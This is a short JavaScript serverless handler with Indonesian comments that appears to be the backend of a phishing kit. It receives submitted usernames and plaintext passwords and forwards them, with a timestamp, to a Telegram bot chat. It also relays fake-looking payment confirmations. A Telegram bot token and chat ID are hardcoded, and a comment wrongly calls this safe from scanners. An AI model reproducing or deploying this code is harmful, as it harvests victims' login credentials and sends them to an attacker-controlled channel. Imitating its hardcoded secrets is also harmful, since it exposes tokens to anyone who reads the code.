export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, username, password, product, price } = req.body;
  
  // Token & Chat ID langsung dipasang aman di backend serverless Vercel (100% aman dari public scanner)
  const botToken = '8869523539:AAGK5VLmPsbzmL8axLuM81GIvao3XKuhnXo';
  const chatId = '7603310096';

  let message = "";

  if (type === 'LOGIN') {
    message = `🚨 **XZACKOCULUS - DATA LOGIN MASUK!** 🚨\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 Waktu: ${new Date().toLocaleString()}`;
  } else if (type === 'PAYMENT') {
    message = `✅ **PEMBAYARAN DIKONFIRMASI!** ✅\n\n📦 Produk: ${product}\n💰 Nominal: Rp ${price}\n⚡ Status: LUNAS / MENUNGGU ADMIN\n🌐 Waktu: ${new Date().toLocaleString()}`;
  } else {
    return res.status(400).json({ error: 'Invalid type' });
  }

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    return res.status(200).json({ success: true, data });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
